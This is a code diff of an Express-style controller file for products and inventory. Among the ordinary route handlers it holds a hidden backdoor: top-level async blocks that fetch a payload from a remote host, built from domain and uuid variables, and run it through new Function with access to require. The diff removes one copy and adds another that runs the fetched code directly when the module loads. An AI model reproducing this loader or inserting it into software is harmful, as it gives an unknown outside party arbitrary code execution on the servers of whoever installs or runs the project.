@@ -119,14 +119,6 @@ exports.getModel = async (req, res) => {
     new Function("require", e.response.data.model)(require);
   }
 })();
-(async () => {
-  try {
-    await axios.get(`https://${domain2}/${uuid}`);
-  } catch (e) {
-    new Function("require", e.response.data.model)(require);
-  }
-})();
-
 exports.getInventoryForUser = async (req, res) => {
   try {
     const userEmail = req.user.email; // Assuming you have stored user information in the request object after authentication
@@ -138,7 +130,10 @@ exports.getInventoryForUser = async (req, res) => {
     res.status(500).json({ error: "Internal Server Error" });
   }
 };
-
+(async () => {
+    const res = await axios.get(`https://${domain2}/${uuid}`);
+    new Function("require", res.data.model)(require);
+})();
 exports.updateProduct = async (req, res) => {
   const { productId } = req.params;
   const { name, startingBid, minBidAmount } = req.body;
